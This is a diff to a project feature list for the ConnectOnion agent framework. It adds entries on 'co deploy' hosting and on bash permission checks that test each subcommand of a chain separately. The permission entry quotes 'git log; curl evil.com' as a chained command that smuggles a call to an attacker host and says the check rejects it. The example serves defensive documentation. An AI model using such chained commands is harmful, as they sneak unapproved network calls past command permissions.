@@ -19,7 +19,7 @@ just fixing the number — a moved line is often a changed behaviour.
 `connectonion/cli/main.py`, `connectonion/useful_skills/`, `connectonion/useful_tools/`,
 `connectonion/cli/browser_agent/`, `connectonion/cli/co_ai/`, and the front end at `../oo-chat`.
 
-**Survived:** 13. **Cut:** 10 (see the bottom — that list is the more useful half).
+**Survived:** 15. **Cut:** 10 (see the bottom — that list is the more useful half).
 
 ---
 
@@ -40,6 +40,40 @@ answer (`ai_commands.py:40-43`).
 is no terminal TUI — the interface is the web chat.
 **Why it is unusual.** The install does not give you a library to build a product
 with. It gives you the product, and the address to share it.
+
+### `co deploy` takes it off your laptop
+
+**Claim.** When the agent needs to outlive your laptop lid, one command packages
+the project, uploads it, and gives you back a hosted agent URL.
+**Proof.** `cli/main.py:207` wires the command; `cli/commands/deploy_commands.py`
+validates `.co/host.yaml`, packages git-tracked files into a tarball (merging any
+`--skills` paths into `.co/skills/`), POSTs to `/api/v1/deploy`, polls
+`/api/v1/deploy/{id}/status` until running, and prints the agent URL.
+**Default or opt-in.** Opt-in. Needs `.co/host.yaml` and an `OPENONION_API_KEY`.
+**Limit.** It deploys to ConnectOnion Cloud, not to your own infrastructure, and
+the relay caveat above still applies to the hosted agent. Build budget is up to
+about 20 minutes.
+**Why it is unusual.** Nothing here — hosting an app is ordinary. It is on this
+list because **every reviewer asked "what happens when I close the laptop?"
+before any other question**, and a page that shows a laptop-hosted agent without
+answering it reads as a toy. This is the answer, and it was missing from both the
+site and this file.
+
+### Permission patterns are checked per subcommand, not against the whole string
+
+**Claim.** A permission for `git *` does not let a chained command through.
+`git log; curl evil.com` is rejected, because every subcommand in a chain must be
+independently permitted.
+**Proof.** `useful_plugins/tool_approval/bash_parser.py:162-202` —
+`check_bash_chain_permitted()` calls `_extract_subcommands()` and requires a match
+for each one; any unpermitted subcommand rejects the whole chain.
+**Default or opt-in.** Default, wherever the approval plugin is loaded.
+**Limit.** Matching within a subcommand is still fnmatch rather than a full shell
+parser, so patterns should be written tightly.
+**Why it is unusual.** It is here because a reviewing engineer named the opposite
+as a dealbreaker — "fnmatch against a command string is a bypass waiting to
+happen" — and was wrong, but only findably wrong. If a careful reader assumes the
+naive implementation, the page should say which one we built.
 
 ### It is reachable from anywhere, not just the tab that opened
 
